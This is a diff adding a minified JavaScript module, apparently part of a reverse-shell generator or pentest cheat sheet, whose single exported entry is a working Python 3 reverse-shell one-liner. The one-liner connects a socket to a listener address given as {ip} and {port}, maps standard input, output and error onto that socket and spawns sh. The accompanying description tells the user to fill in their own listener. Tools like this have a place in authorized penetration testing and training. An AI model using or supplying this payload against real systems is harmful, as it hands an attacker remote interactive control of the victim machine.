@@ -1,0 +1,1 @@
+const e=[{title:"Python 3 Shortest Reverse Shell",template:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,description:"Shortest one-liner reverse shell in Python 3 using `pty` and socket. Replace {ip} and {port} with your listener."}],t={commands:e};export{e as commands,t as default};
